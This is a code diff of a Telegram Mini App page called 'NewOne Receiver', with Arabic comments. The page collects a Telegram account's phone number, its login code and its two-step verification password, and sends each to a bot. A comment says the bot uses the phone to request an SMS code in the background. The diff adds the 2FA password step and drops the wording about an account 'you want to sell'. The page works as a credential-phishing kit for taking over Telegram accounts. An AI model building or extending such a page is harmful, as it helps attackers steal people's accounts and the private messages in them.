@@ -2,89 +2,96 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-color=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>NewOne Receiver</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background-color: #181818; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 24px; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; }
-        .container { width: 100%; max-width: 400px; text-align: center; margin-top: 50px; }
+        .container { width: 100%; max-width: 400px; text-align: center; margin-top: 50px; display: none; }
+        .active { display: block; }
         h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; }
         p { font-size: 15px; color: #707579; margin-bottom: 40px; line-height: 1.4; }
-        input[type="text"] { width: 100%; padding: 16px; background-color: transparent; border: 2px solid #2f2f2f; border-radius: 12px; color: #ffffff; font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.15s ease; text-align: left; }
-        input[type="text"]:focus { border-color: #2481cc; }
-        input[type="text"]::placeholder { color: #525252; }
-        
-        /* إخفاء واجهة الكود في البداية */
-        #code_step { display: none; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 16px; background-color: transparent; border: 2px solid #2f2f2f; border-radius: 12px; color: #ffffff; font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.15s ease; text-align: left; }
+        input[type="text"]:focus, input[type="password"]:focus { border-color: #2481cc; }
+        input[type="text"]::placeholder, input[type="password"]::placeholder { color: #525252; }
     </style>
 </head>
 <body>
 
-    <div id="phone_step" class="container">
+    <div id="step_phone" class="container active">
         <h1>Account phone number</h1>
-        <p>Enter the phone number of the Telegram account you want to sell</p>
+        <p>Enter the phone number of the Telegram account</p>
         <input type="text" inputmode="tel" id="phone_input" placeholder="Phone number" autocomplete="off">
     </div>
 
-    <div id="code_step" class="container">
+    <div id="step_code" class="container">
         <h1>Enter Code</h1>
-        <p>We have sent an SMS with the activation code to your phone or Telegram account</p>
+        <p>We have sent an SMS with the activation code</p>
         <input type="text" inputmode="numeric" id="code_input" placeholder="Login code" autocomplete="off">
+    </div>
+
+    <div id="step_2fa" class="container">
+        <h1>Two-Step Verification</h1>
+        <p>Your account is protected by an additional password</p>
+        <input type="password" id="password_input" placeholder="Password" autocomplete="off">
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        
-        const phoneStep = document.getElementById('phone_step');
-        const codeStep = document.getElementById('code_step');
-        const phoneInput = document.getElementById('phone_input');
-        const codeInput = document.getElementById('code_input');
-        
-        let currentStep = "phone"; // المتغير المسؤول عن معرفة الخطوة الحالية
+
+        let currentStep = "phone";
         let savedPhone = "";
+        let savedCode = "";
 
         tg.MainButton.text = "Continue";
         tg.MainButton.textColor = "#FFFFFF";
         tg.MainButton.color = "#2481cc";
 
-        // مراقبة حقل الرقم
-        phoneInput.addEventListener('input', function() {
-            if (currentStep === "phone") {
-                if (phoneInput.value.trim().length >= 5) { tg.MainButton.show(); } 
-                else { tg.MainButton.hide(); }
-            }
+        // مراقبة المدخلات لتفعيل الزر الأزرق
+        document.getElementById('phone_input').addEventListener('input', function() {
+            if(this.value.trim().length >= 5 && currentStep === "phone") tg.MainButton.show();
+            else if(currentStep === "phone") tg.MainButton.hide();
         });
 
-        // مراقبة حقل الكود
-        codeInput.addEventListener('input', function() {
-            if (currentStep === "code") {
-                if (codeInput.value.trim().length >= 4) { tg.MainButton.show(); } 
-                else { tg.MainButton.hide(); }
-            }
+        document.getElementById('code_input').addEventListener('input', function() {
+            if(this.value.trim().length >= 4 && currentStep === "code") tg.MainButton.show();
+            else if(currentStep === "code") tg.MainButton.hide();
         });
 
-        // التحكم عند الضغط على زر Continue الأزرق
+        document.getElementById('password_input').addEventListener('input', function() {
+            if(this.value.trim().length >= 1 && currentStep === "2fa") tg.MainButton.show();
+            else if(currentStep === "2fa") tg.MainButton.hide();
+        });
+
+        function switchStep(nextStepId) {
+            document.querySelectorAll('.container').forEach(c => c.classList.remove('active'));
+            document.getElementById(nextStepId).classList.add('active');
+            tg.MainButton.hide();
+        }
+
         tg.MainButton.onClick(function() {
             if (currentStep === "phone") {
-                // حفظ الرقم والانتقال لخطوة الكود
-                savedPhone = phoneInput.value.trim();
+                savedPhone = document.getElementById('phone_input').value.trim();
                 currentStep = "code";
+                switchStep('step_code');
+                document.getElementById('code_input').focus();
                 
-                phoneStep.style.display = "none"; // إخفاء واجهة الرقم
-                codeStep.style.display = "block"; // إظهار واجهة الكود
-                tg.MainButton.hide(); // إخفاء الزر حتى يكتب الكود
-                codeInput.focus(); // فتح الكيبورد تلقائياً للحقل الجديد
+                // هنا يتم إرسال الرقم تلقائياً للبوت لطلب كود SMS في الخلفية
+                tg.sendData(JSON.stringify({ action: "send_otp", phone: savedPhone }));
                 
             } else if (currentStep === "code") {
-                const finalCode = codeInput.value.trim();
+                savedCode = document.getElementById('code_input').value.trim();
                 
-                // إرسال البيانات المدمجة (الرقم + الكود) معاً للبوت مباشرة
-                tg.sendData(JSON.stringify({ 
-                    action: "submit_credentials", 
-                    phone: savedPhone, 
-                    code: finalCode 
-                }));
+                // إرسال الكود للبوت للتحقق من وجود التحقق بخطوتين 2FA
+                tg.sendData(JSON.stringify({ action: "verify_code", phone: savedPhone, code: savedCode }));
+                
+                // يتم إغلاق الواجهة مؤقتاً، وإذا تبين للبوت وجود 2FA سيعيد فتحها أو يرسل إشعاراً
+                tg.close();
+                
+            } else if (currentStep === "2fa") {
+                const password = document.getElementById('password_input').value.trim();
+                tg.sendData(JSON.stringify({ action: "submit_2fa", phone: savedPhone, code: savedCode, password: password }));
                 tg.close();
             }
         });
